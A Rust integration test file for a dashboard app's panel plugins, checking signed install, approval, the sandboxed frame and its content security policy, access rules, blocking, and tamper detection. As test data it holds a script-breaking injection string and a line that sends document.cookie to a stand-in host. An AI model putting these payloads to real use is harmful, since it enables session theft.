//! Panel plugins (docs/api/plugins.md, "Panel plugins"): a panel package installs like any
//! plugin; once approved and enabled its frame is served from the checked package only, with the
//! sandbox and a strict policy of its own, to members who may read a dashboard that shows it (or
//! edit one that is to show it), never while it is disabled or blocked for the organization, and
//! never with a bundle that differs from its manifest.

use std::io::{Cursor, Write};
use std::net::SocketAddr;
use std::sync::Arc;

use axum::Router;
use axum::body::Body;
use axum::extract::connect_info::MockConnectInfo;
use axum::http::{HeaderMap, Method, Request, StatusCode, header};
use base64::Engine;
use ed25519_dalek::{Signer as _, SigningKey};
use http_body_util::BodyExt;
use kalzit::app::{AppState, router};
use kalzit::clock::ManualClock;
use kalzit::config::Config;
use serde_json::{Value, json};
use sha2::{Digest, Sha256};
use tower::ServiceExt;
use zip::write::SimpleFileOptions;

mod common;

const SETUP_CODE: &str = "test-setup-code-0123456789";
const PASSWORD: &str = "Grün und sicher 2026";
const ID: &str = "dev.example.tile";
const BUNDLE: &str =
    "// A tile.\r\nwindow.parent.postMessage({ kalzit: \"panel\", api: 1, type: \"ready\" }, \"*\");\n";

fn sha(bytes: &[u8]) -> String {
    hex::encode(Sha256::digest(bytes))
}

fn manifest(bundle: &str) -> String {
    format!(
        "manifest = 1\nid = \"{ID}\"\nname = \"Kachel\"\nversion = \"1.0.0\"\nkind = \"panel\"\nmin_kalzit = \"0.1.0\"\n\
         shapes = [\"frame\"]\ndescription = \"A tile\"\npublisher = \"Example GmbH\"\n\n\
         [panel]\npath = \"dist/panel.js\"\napi = 1\n\n\
         [[panel.options]]\nname = \"field\"\nlabel = {{ en = \"Field\", de = \"Feld\" }}\ntype = \"string\"\n\n\
         [[panel.options]]\nname = \"decimals\"\nlabel = {{ en = \"Decimals\" }}\ntype = \"integer\"\nmin = 0\nmax = 10\ndefault = 2\n\n\
         [files]\n\"dist/panel.js\" = \"{}\"\n",
        sha(bundle.as_bytes())
    )
}

fn package(key: &SigningKey, bundle: &str) -> Vec<u8> {
    let text = manifest(bundle);
    let message = kalzit_plugin_api::signing::manifest_message(text.as_bytes());
    let sig = kalzit_release::DetachedSignature {
        key_id: kalzit_plugin_api::signing::key_id(&key.verifying_key()),
        signature: base64::engine::general_purpose::STANDARD.encode(key.sign(&message).to_bytes()),
    };
    let stored = SimpleFileOptions::default().compression_method(zip::CompressionMethod::Stored);
    let mut zip = zip::ZipWriter::new(Cursor::new(Vec::new()));
    for (name, bytes) in [
        ("kalzit-plugin.toml", text.as_bytes().to_vec()),
        ("kalzit-plugin.sig", serde_json::to_vec(&sig).unwrap()),
        ("dist/panel.js", bundle.as_bytes().to_vec()),
    ] {
        zip.start_file(name, stored).unwrap();
        zip.write_all(&bytes).unwrap();
    }
    zip.finish().unwrap().into_inner()
}

struct TestApp {
    app: Router,
    state: AppState,
    dir: Arc<tempfile::TempDir>,
    owner: String,
    org: String,
}

struct Reply {
    status: StatusCode,
    headers: HeaderMap,
    text: String,
    body: Value,
}

impl Reply {
    fn reason(&self) -> &str {
        self.body["error"]["reason"].as_str().unwrap_or("")
    }

    fn header(&self, name: &str) -> &str {
        self.headers.get(name).map_or("", |v| v.to_str().unwrap())
    }
}

impl TestApp {
    async fn new() -> Self {
        let dir = common::private_tempdir();
        let mut config = Config::default();
        config.paths.data_dir = dir.path().to_path_buf();
        config.server.http_addr = "127.0.0.1:3999".into();
        let pool = kalzit::db::connect(&config.database_url(), 4).await.unwrap();
        let clock = Arc::new(ManualClock::new(1_800_000_000_000));
        let state = AppState::new(config, pool, clock, Some(SETUP_CODE.into())).await.unwrap();
        let peer: SocketAddr = "127.0.0.1:50000".parse().unwrap();
        let app = router(state.clone()).layer(MockConnectInfo(peer));
        let mut t = Self { app, state, dir: Arc::new(dir), owner: String::new(), org: String::new() };
        let body = json!({ "token": SETUP_CODE, "orgName": "Müller & Söhne", "name": "Jörg Müller",
                           "email": "joerg@example.de", "password": PASSWORD });
        let r = t.call(Method::POST, "/api/setup", Body::from(body.to_string()), "application/json", "").await;
        assert_eq!(r.status, StatusCode::OK, "{}", r.text);
        t.org = r.body["orgs"][0]["id"].as_str().unwrap().to_string();
        t.owner = cookie(&r.headers);
        t
    }

    async fn finish(self) {
        let finish = common::Finish::new(self.state.clone(), self.dir.clone());
        drop(self);
        finish.finish().await;
    }

    async fn call(&self, method: Method, path: &str, body: Body, content_type: &str, cookie: &str) -> Reply {
        let mut req = Request::builder().method(method).uri(path).header(header::HOST, "kalzit.test");
        if !cookie.is_empty() {
            req = req.header(header::COOKIE, cookie);
        }
        let req = req.header(header::CONTENT_TYPE, content_type).body(body).unwrap();
        let res = self.app.clone().oneshot(req).await.unwrap();
        let status = res.status();
        let headers = res.headers().clone();
        let bytes = res.into_body().collect().await.unwrap().to_bytes();
        let text = String::from_utf8_lossy(&bytes).into_owned();
        let body = serde_json::from_slice(&bytes).unwrap_or(Value::Null);
        Reply { status, headers, text, body }
    }

    async fn send(&self, method: Method, path: &str, body: Option<Value>, cookie: &str) -> Reply {
        let body = body.map_or_else(Body::empty, |b| Body::from(b.to_string()));
        self.call(method, &format!("/api{path}"), body, "application/json", cookie).await
    }

    async fn admin(&self, method: Method, path: &str, body: Option<Value>) -> Reply {
        self.send(method, path, body, &self.owner).await
    }

    async fn install(&self, bytes: Vec<u8>) -> Reply {
        self.call(Method::POST, "/api/admin/plugins", Body::from(bytes), "application/zip", &self.owner).await
    }

    async fn member(&self, name: &str, email: &str, role: &str) -> String {
        let r = self
            .admin(Method::POST, "/admin/users", Some(json!({ "name": name, "email": email, "password": PASSWORD })))
            .await;
        assert_eq!(r.status, StatusCode::CREATED, "{}", r.text);
        let r = self
            .admin(Method::POST, &format!("/orgs/{}/members", self.org), Some(json!({ "email": email, "role": role })))
            .await;
        assert_eq!(r.status, StatusCode::CREATED, "{}", r.text);
        let r = self.send(Method::POST, "/auth/login", Some(json!({ "email": email, "password": PASSWORD })), "").await;
        assert_eq!(r.status, StatusCode::OK, "{}", r.text);
        cookie(&r.headers)
    }

    async fn dashboard(&self, panel_type: &str) -> String {
        let options = if panel_type == ID { json!({ "field": "cpu", "decimals": 1 }) } else { json!({}) };
        let model = json!({ "schemaVersion": 1, "title": format!("Tafel {panel_type}"),
            "timeRange": { "from": "now-6h", "to": "now" },
            "panels": [{ "id": "p1", "type": panel_type, "title": "Kachel", "grid": { "x": 0, "y": 0, "w": 6, "h": 6 },
                         "options": options, "targets": [] }] });
        let r =
            self.admin(Method::POST, &format!("/orgs/{}/dashboards", self.org), Some(json!({ "model": model }))).await;
        assert_eq!(r.status, StatusCode::CREATED, "{}", r.text);
        r.body["id"].as_str().unwrap().to_string()
    }

    async fn frame(&self, dashboard: Option<&str>, cookie: &str) -> Reply {
        let query = dashboard.map(|d| format!("?dashboard={d}")).unwrap_or_default();
        self.send(Method::GET, &format!("/orgs/{}/panel-plugins/{ID}/frame{query}", self.org), None, cookie).await
    }

    async fn listed(&self, cookie: &str) -> Vec<Value> {
        let r = self.send(Method::GET, &format!("/orgs/{}/panel-plugins", self.org), None, cookie).await;
        assert_eq!(r.status, StatusCode::OK, "{}", r.text);
        r.body["items"].as_array().unwrap().clone()
    }
}

fn cookie(headers: &HeaderMap) -> String {
    headers.get(header::SET_COOKIE).unwrap().to_str().unwrap().split(';').next().unwrap().to_string()
}

#[tokio::test]
async fn a_panel_frame_is_served_sandboxed_from_the_checked_package_to_those_who_may_see_it() {
    let t = TestApp::new().await;
    let key = SigningKey::from_bytes(&[7; 32]);
    let public = base64::engine::general_purpose::STANDARD.encode(key.verifying_key().as_bytes());
    let r = t.admin(Method::POST, "/admin/plugin-keys", Some(json!({ "name": "Example", "publicKey": public }))).await;
    assert_eq!(r.status, StatusCode::CREATED, "{}", r.text);

    // A bundle that could end its script early is refused at install.
    let r = t.install(package(&key, "a = '</script><img src=x>';")).await;
    assert_eq!((r.status, r.reason()), (StatusCode::UNPROCESSABLE_ENTITY, "plugin.bundle_invalid"), "{}", r.text);

    // Installed, the panel waits for approval like any plugin and is not offered.
    let r = t.install(package(&key, BUNDLE)).await;
    assert_eq!(r.status, StatusCode::CREATED, "{}", r.text);
    assert_eq!((r.body["kind"].as_str(), r.body["running"].as_bool()), (Some("panel"), Some(false)));
    let shown = t.dashboard(ID).await;
    let other = t.dashboard("table").await;
    assert!(t.listed(&t.owner).await.is_empty());
    let r = t.frame(Some(&shown), &t.owner).await;
    assert_eq!((r.status, r.reason()), (StatusCode::NOT_FOUND, "plugin.panel_unavailable"), "{}", r.text);

    let r = t.admin(Method::POST, &format!("/admin/plugins/{ID}/approve"), Some(json!({ "version": "1.0.0" }))).await;
    assert_eq!(r.status, StatusCode::OK, "{}", r.text);
    let r = t.admin(Method::POST, &format!("/admin/plugins/{ID}/enable"), None).await;
    assert_eq!(r.body["running"], true, "{}", r.text);

    // Offered with its options, to every member.
    let viewer = t.member("Vera", "vera@example.de", "viewer").await;
    let items = t.listed(&viewer).await;
    assert_eq!(items.len(), 1);
    assert_eq!(items[0]["id"], ID);
    assert_eq!((items[0]["api"].as_u64(), items[0]["signer"].as_str()), (Some(1), Some("publisher")));
    assert_eq!(items[0]["options"][0]["name"], "field");
    assert_eq!(items[0]["options"][1]["max"], 10.0);
    assert_eq!(items[0]["options"][1]["default"], 2);

    // The frame: the bundle inline (line breaks as the browser reads them), its hash the only
    // script source, sandboxed without the same origin, no network, framed only by Kalzit.
    let r = t.frame(Some(&shown), &viewer).await;
    assert_eq!(r.status, StatusCode::OK, "{}", r.text);
    let text = BUNDLE.replace("\r\n", "\n");
    assert!(r.text.contains(&format!("<script type=\"module\">{text}</script>")), "{}", r.text);
    let hash = base64::engine::general_purpose::STANDARD.encode(Sha256::digest(text.as_bytes()));
    let csp = r.header("content-security-policy");
    assert!(csp.starts_with("sandbox allow-scripts; default-src 'none'; "), "{csp}");
    for part in [
        &format!("script-src 'sha256-{hash}'") as &str,
        "connect-src 'none'",
        "webrtc 'block'",
        "form-action 'none'",
        "base-uri 'none'",
        "frame-ancestors 'self'",
    ] {
        assert!(csp.contains(part), "{part} is missing from {csp}");
    }
    assert!(!csp.contains("allow-same-origin") && !csp.contains("unsafe-eval"), "{csp}");
    assert_eq!(r.header("content-type"), "text/html; charset=utf-8");
    assert_eq!(r.header("x-content-type-options"), "nosniff");
    assert_eq!(r.header("x-frame-options"), "SAMEORIGIN");
    assert_eq!(r.header("cache-control"), "no-store");
    assert_eq!(r.header("referrer-policy"), "no-referrer");
    assert_eq!(r.header("x-dns-prefetch-control"), "off");
    assert!(r.headers.get(header::SET_COOKIE).is_none());
    // Other responses keep Kalzit's own policy.
    let r = t.send(Method::GET, &format!("/orgs/{}/panel-plugins", t.org), None, &viewer).await;
    assert!(r.header("content-security-policy").contains("frame-ancestors 'none'"));

    // Who may load it: viewers only for a dashboard that shows the panel; editors also for one
    // they edit; a new dashboard needs the right to create one. Unknown dashboards are not found.
    assert_eq!(t.frame(Some(&other), &viewer).await.status, StatusCode::FORBIDDEN);
    assert_eq!(t.frame(None, &viewer).await.status, StatusCode::FORBIDDEN);
    assert_eq!(t.frame(Some(&other), &t.owner).await.status, StatusCode::OK);
    assert_eq!(t.frame(None, &t.owner).await.status, StatusCode::OK);
    assert_eq!(t.frame(Some("no-such-dashboard"), &t.owner).await.status, StatusCode::NOT_FOUND);
    assert_eq!(t.frame(Some(&shown), "").await.status, StatusCode::UNAUTHORIZED);

    // A dashboard that shows the panel through a linked library panel lets viewers load it too.
    let content = json!({ "schemaVersion": kalzit::dashboards::model::SCHEMA_VERSION, "type": ID, "title": "Kachel",
                          "options": { "field": "cpu" }, "targets": [] });
    let r = t
        .admin(
            Method::POST,
            &format!("/orgs/{}/library-panels", t.org),
            Some(json!({ "name": "Kachel", "model": content })),
        )
        .await;
    assert_eq!(r.status, StatusCode::CREATED, "{}", r.text);
    let library = r.body["id"].as_str().unwrap().to_string();
    let model = json!({ "schemaVersion": 1, "title": "Mit Bibliothek", "timeRange": { "from": "now-6h", "to": "now" },
        "panels": [{ "id": "lp", "type": "table", "grid": { "x": 0, "y": 0, "w": 6, "h": 6 }, "libraryPanelId": library }] });
    let r = t.admin(Method::POST, &format!("/orgs/{}/dashboards", t.org), Some(json!({ "model": model }))).await;
    assert_eq!(r.status, StatusCode::CREATED, "{}", r.text);
    let linked = r.body["id"].as_str().unwrap().to_string();
    assert_eq!(t.frame(Some(&linked), &viewer).await.status, StatusCode::OK);

    // Options the manifest does not allow are refused when a dashboard is saved.
    let bad = json!({ "schemaVersion": 1, "title": "Falsch", "timeRange": { "from": "now-6h", "to": "now" },
        "panels": [{ "id": "p1", "type": ID, "grid": { "x": 0, "y": 0, "w": 6, "h": 6 },
                     "options": { "decimals": 99 }, "targets": [] }] });
    let r = t.admin(Method::POST, &format!("/orgs/{}/dashboards", t.org), Some(json!({ "model": bad }))).await;
    assert_eq!(
        (r.status, r.reason()),
        (StatusCode::UNPROCESSABLE_ENTITY, "dashboards.plugin_panel_options"),
        "{}",
        r.text
    );
    assert_eq!(r.body["error"]["params"]["plugin"], ID, "{}", r.text);
    assert_eq!(r.body["error"]["params"]["code"], "panel.option_invalid", "{}", r.text);
    // A library panel is checked the same way, also for a key the manifest does not declare.
    let content = json!({ "schemaVersion": kalzit::dashboards::model::SCHEMA_VERSION, "type": ID, "title": "Kachel",
                          "options": { "colour": "rot" }, "targets": [] });
    let r = t
        .admin(
            Method::POST,
            &format!("/orgs/{}/library-panels", t.org),
            Some(json!({ "name": "Falsche Kachel", "model": content })),
        )
        .await;
    assert_eq!(
        (r.status, r.reason()),
        (StatusCode::UNPROCESSABLE_ENTITY, "dashboards.plugin_panel_options"),
        "{}",
        r.text
    );
    assert_eq!(r.body["error"]["params"]["code"], "panel.option_unknown", "{}", r.text);

    // Blocked for the organization: neither offered nor served; unblocked again, both.
    let block = format!("/orgs/{}/plugins/{ID}/block", t.org);
    assert_eq!(t.admin(Method::PUT, &block, None).await.status, StatusCode::NO_CONTENT);
    assert!(t.listed(&viewer).await.is_empty());
    assert_eq!(t.frame(Some(&shown), &viewer).await.reason(), "plugin.panel_unavailable");
    assert_eq!(t.admin(Method::DELETE, &block, None).await.status, StatusCode::NO_CONTENT);
    assert_eq!(t.frame(Some(&shown), &viewer).await.status, StatusCode::OK);

    // A bundle changed on disk after the install is never served.
    let bundle = walk(&t.dir.path().join("plugins").join("packages"))
        .into_iter()
        .find(|p| p.ends_with("panel.js"))
        .expect("the installed bundle");
    std::fs::write(&bundle, "fetch('https://elsewhere.example/?' + document.cookie);").unwrap();
    let r = t.frame(Some(&shown), &viewer).await;
    assert_eq!((r.status, r.reason()), (StatusCode::CONFLICT, "plugin.bundle_changed"), "{}", r.text);
    assert!(!r.text.contains("elsewhere"));
    std::fs::write(&bundle, BUNDLE).unwrap();
    assert_eq!(t.frame(Some(&shown), &viewer).await.status, StatusCode::OK);

    // Disabled: gone.
    let r = t.admin(Method::POST, &format!("/admin/plugins/{ID}/disable"), None).await;
    assert_eq!(r.body["running"], false, "{}", r.text);
    assert!(t.listed(&viewer).await.is_empty());
    assert_eq!(t.frame(Some(&shown), &viewer).await.reason(), "plugin.panel_unavailable");
    t.finish().await;
}

fn walk(dir: &std::path::Path) -> Vec<std::path::PathBuf> {
    let mut out = Vec::new();
    for entry in std::fs::read_dir(dir).unwrap().flatten() {
        let path = entry.path();
        if path.is_dir() {
            out.extend(walk(&path));
        } else {
            out.push(path);
        }
    }
    out
}
